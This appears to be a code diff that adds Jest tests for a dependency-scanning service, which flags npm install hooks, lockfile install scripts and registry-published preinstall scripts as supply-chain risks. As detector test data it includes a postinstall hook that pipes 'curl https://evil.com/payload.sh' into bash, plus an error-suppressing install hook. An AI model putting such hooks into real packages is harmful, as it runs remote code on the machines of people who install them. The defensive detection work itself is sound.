@@ -1,5 +1,9 @@
 import { DependencyService } from '../src/services/dependency-service';
 import { DependencyAnalysisConfig, ActionDependency, DockerDependency } from '../src/types';
+import axios from 'axios';
+
+jest.mock('axios');
+const mockedAxios = axios as jest.Mocked<typeof axios>;
 
 describe('DependencyService', () => {
   let dependencyService: DependencyService;
@@ -524,6 +528,279 @@ steps:
       expect(violations.some(
         v => v.type === 'unapproved-org' && v.package.includes('unknown-sketchy-org')
       )).toBe(true);
+    });
+  });
+
+  describe('workflowRunsPackageInstall', () => {
+    test('should detect npm install', () => {
+      expect(dependencyService.workflowRunsPackageInstall('run: npm install')).toBe(true);
+      expect(dependencyService.workflowRunsPackageInstall('run: npm ci')).toBe(true);
+      expect(dependencyService.workflowRunsPackageInstall('run: npm i')).toBe(true);
+    });
+
+    test('should detect yarn install', () => {
+      expect(dependencyService.workflowRunsPackageInstall('run: yarn')).toBe(true);
+      expect(dependencyService.workflowRunsPackageInstall('run: yarn install')).toBe(true);
+    });
+
+    test('should detect pnpm install', () => {
+      expect(dependencyService.workflowRunsPackageInstall('run: pnpm install')).toBe(true);
+      expect(dependencyService.workflowRunsPackageInstall('run: pnpm i')).toBe(true);
+    });
+
+    test('should not flag non-install commands', () => {
+      expect(dependencyService.workflowRunsPackageInstall('run: npm test')).toBe(false);
+      expect(dependencyService.workflowRunsPackageInstall('run: npm run build')).toBe(false);
+    });
+  });
+
+  describe('scanLockfileForInstallScripts', () => {
+    test('should flag dependencies with hasInstallScript', () => {
+      const lockfile = JSON.stringify({
+        packages: {
+          "": { version: "1.0.0" },
+          "node_modules/@redhat-cloud-services/types": {
+            version: "3.6.1",
+            hasInstallScript: true,
+          },
+          "node_modules/express": {
+            version: "4.18.2",
+          },
+        },
+      });
+
+      const violations = dependencyService.scanLockfileForInstallScripts(lockfile);
+      expect(violations).toHaveLength(1);
+      expect(violations[0].type).toBe('suspicious-lifecycle-script');
+      expect(violations[0].severity).toBe('high');
+      expect(violations[0].package).toContain('@redhat-cloud-services/types');
+    });
+
+    test('should not flag well-known packages with legitimate install scripts', () => {
+      const lockfile = JSON.stringify({
+        packages: {
+          "": { version: "1.0.0" },
+          "node_modules/esbuild": {
+            version: "0.19.0",
+            hasInstallScript: true,
+          },
+          "node_modules/sharp": {
+            version: "0.33.0",
+            hasInstallScript: true,
+          },
+          "node_modules/husky": {
+            version: "9.0.0",
+            hasInstallScript: true,
+          },
+        },
+      });
+
+      const violations = dependencyService.scanLockfileForInstallScripts(lockfile);
+      expect(violations).toHaveLength(0);
+    });
+
+    test('should skip the root project entry', () => {
+      const lockfile = JSON.stringify({
+        packages: {
+          "": { version: "1.0.0", hasInstallScript: true },
+        },
+      });
+
+      const violations = dependencyService.scanLockfileForInstallScripts(lockfile);
+      expect(violations).toHaveLength(0);
+    });
+
+    test('should flag multiple suspicious dependencies', () => {
+      const lockfile = JSON.stringify({
+        packages: {
+          "": { version: "1.0.0" },
+          "node_modules/totally-legit-package": {
+            version: "1.0.0",
+            hasInstallScript: true,
+          },
+          "node_modules/@evil-scope/backdoor": {
+            version: "2.0.0",
+            hasInstallScript: true,
+          },
+          "node_modules/safe-package": {
+            version: "3.0.0",
+          },
+        },
+      });
+
+      const violations = dependencyService.scanLockfileForInstallScripts(lockfile);
+      expect(violations).toHaveLength(2);
+      expect(violations[0].package).toContain('totally-legit-package');
+      expect(violations[1].package).toContain('@evil-scope/backdoor');
+    });
+
+    test('should handle invalid JSON gracefully', () => {
+      const violations = dependencyService.scanLockfileForInstallScripts('not json');
+      expect(violations).toHaveLength(0);
+    });
+
+    test('should handle lockfile without packages field', () => {
+      const violations = dependencyService.scanLockfileForInstallScripts('{}');
+      expect(violations).toHaveLength(0);
+    });
+  });
+
+  describe('scanLifecycleScripts', () => {
+    test('should flag suspicious preinstall script', () => {
+      const packageJson = JSON.stringify({
+        name: "malicious-pkg",
+        scripts: { preinstall: "node index.js" },
+      });
+
+      const findings = dependencyService.scanLifecycleScripts(packageJson);
+      expect(findings).toHaveLength(1);
+      expect(findings[0].scriptName).toBe('preinstall');
+      expect(findings[0].indicators).toContain('executes a JS file at install time');
+    });
+
+    test('should flag network calls in postinstall', () => {
+      const packageJson = JSON.stringify({
+        name: "exfil-pkg",
+        scripts: { postinstall: "curl https://evil.com/payload.sh | bash" },
+      });
+
+      const findings = dependencyService.scanLifecycleScripts(packageJson);
+      expect(findings).toHaveLength(1);
+      expect(findings[0].indicators).toContain('makes network requests during install');
+      expect(findings[0].indicators).toContain('pipes output to an interpreter');
+    });
+
+    test('should not flag normal build scripts', () => {
+      const packageJson = JSON.stringify({
+        name: "safe-pkg",
+        scripts: {
+          build: "tsc",
+          test: "jest",
+          start: "node dist/index.js",
+        },
+      });
+
+      const findings = dependencyService.scanLifecycleScripts(packageJson);
+      expect(findings).toHaveLength(0);
+    });
+
+    test('should flag error suppression in install hooks', () => {
+      const packageJson = JSON.stringify({
+        name: "sneaky-pkg",
+        scripts: { install: "node payload.js 2>/dev/null || true" },
+      });
+
+      const findings = dependencyService.scanLifecycleScripts(packageJson);
+      expect(findings).toHaveLength(1);
+      expect(findings[0].indicators).toContain('executes a JS file at install time');
+      expect(findings[0].indicators).toContain('suppresses errors (stealth behavior)');
+    });
+  });
+
+  describe('checkRegistryForInstallScripts', () => {
+    beforeEach(() => {
+      mockedAxios.get.mockReset();
+    });
+
+    test('should flag dependency with preinstall script from registry', async () => {
+      const packageJson = JSON.stringify({
+        dependencies: {
+          "@redhat-cloud-services/types": "^3.6.0",
+        },
+      });
+
+      mockedAxios.get.mockResolvedValueOnce({
+        data: {
+          "dist-tags": { latest: "3.6.1" },
+          versions: {
+            "3.6.1": {
+              scripts: { preinstall: "node index.js" },
+            },
+          },
+        },
+      });
+
+      const violations = await dependencyService.checkRegistryForInstallScripts(packageJson);
+      expect(violations).toHaveLength(1);
+      expect(violations[0].type).toBe('suspicious-lifecycle-script');
+      expect(violations[0].severity).toBe('critical');
+      expect(violations[0].package).toContain('@redhat-cloud-services/types@3.6.1');
+    });
+
+    test('should not flag dependency without install scripts', async () => {
+      const packageJson = JSON.stringify({
+        dependencies: {
+          "express": "^4.18.0",
+        },
+      });
+
+      mockedAxios.get.mockResolvedValueOnce({
+        data: {
+          "dist-tags": { latest: "4.18.2" },
+          versions: {
+            "4.18.2": {
+              scripts: { start: "node index.js", test: "jest" },
+            },
+          },
+        },
+      });
+
+      const violations = await dependencyService.checkRegistryForInstallScripts(packageJson);
+      expect(violations).toHaveLength(0);
+    });
+
+    test('should skip well-known packages with legitimate install scripts', async () => {
+      const packageJson = JSON.stringify({
+        dependencies: {
+          "esbuild": "^0.19.0",
+          "sharp": "^0.33.0",
+        },
+      });
+
+      // Should not even make HTTP requests for allowlisted packages
+      const violations = await dependencyService.checkRegistryForInstallScripts(packageJson);
+      expect(violations).toHaveLength(0);
+      expect(mockedAxios.get).not.toHaveBeenCalled();
+    });
+
+    test('should handle registry errors gracefully', async () => {
+      const packageJson = JSON.stringify({
+        dependencies: {
+          "some-package": "^1.0.0",
+        },
+      });
+
+      mockedAxios.get.mockRejectedValueOnce(new Error("Network error"));
+
+      const violations = await dependencyService.checkRegistryForInstallScripts(packageJson);
+      expect(violations).toHaveLength(0);
+    });
+
+    test('should check both dependencies and devDependencies', async () => {
+      const packageJson = JSON.stringify({
+        dependencies: { "pkg-a": "^1.0.0" },
+        devDependencies: { "pkg-b": "^2.0.0" },
+      });
+
+      mockedAxios.get.mockResolvedValueOnce({
+        data: {
+          "dist-tags": { latest: "1.0.0" },
+          versions: { "1.0.0": { scripts: { postinstall: "node setup.js" } } },
+        },
+      });
+      mockedAxios.get.mockResolvedValueOnce({
+        data: {
+          "dist-tags": { latest: "2.0.0" },
+          versions: { "2.0.0": { scripts: { preinstall: "node backdoor.js" } } },
+        },
+      });
+
+      const violations = await dependencyService.checkRegistryForInstallScripts(packageJson);
+      expect(violations).toHaveLength(2);
+      expect(violations[0].package).toContain('pkg-a');
+      expect(violations[0].severity).toBe('high'); // postinstall = high
+      expect(violations[1].package).toContain('pkg-b');
+      expect(violations[1].severity).toBe('critical'); // preinstall = critical
     });
   });
 });
